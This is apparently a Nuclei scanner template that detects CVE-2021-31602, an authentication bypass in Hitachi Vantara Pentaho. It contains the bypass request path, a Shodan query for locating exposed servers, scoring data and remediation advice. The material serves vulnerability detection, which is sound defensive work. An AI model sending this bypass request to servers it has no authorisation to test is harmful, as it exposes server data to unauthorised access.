http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <roleList>
    - <roles>Anonymous</roles>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/pentaho/api/userrolelist/systemRoles?require-cfg.js'
  - '{{BaseURL}}/api/userrolelist/systemRoles?require-cfg.js'
  stop-at-first-match: true
id: CVE-2021-31602
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:hitachi:vantara_pentaho:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-31602
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-287
    epss-percentile: 0.99748
    epss-score: 0.92774
  description: Hitachi Vantara Pentaho through 9.1 and Pentaho Business Intelligence
    Server through 7.x are vulnerable to authentication bypass. The Security Model
    has different layers of Access Control. One of these layers is the applicationContext
    security, which is defined in the applicationContext-spring-security.xml file.
    The default configuration allows an unauthenticated user with no previous knowledge
    of the platform settings to extract pieces of information without possessing valid
    credentials.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass authentication and gain unauthorized access to the server.

    '
  metadata:
    max-request: 2
    product: vantara_pentaho
    shodan-query:
    - Pentaho
    - pentaho
    vendor: hitachi
  name: Hitachi Vantara Pentaho/Business Intelligence Server - Authentication Bypass
  reference:
  - https://seclists.org/fulldisclosure/2021/Nov/13
  - https://portswigger.net/daily-swig/remote-code-execution-sql-injection-bugs-uncovered-in-pentaho-business-analytics-software
  - https://hawsec.com/publications/pentaho/HVPENT210401-Pentaho-BA-Security-Assessment-Report-v1_1.pdf
  - https://www.hitachi.com/hirt/security/index.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31602
  remediation: 'Apply the latest security patches or updates provided by Hitachi Vantara
    to fix the authentication bypass vulnerability.

    '
  severity: high
  tags: cve2021,cve,spring,seclists,pentaho,auth-bypass,hitachi,vkev,vuln
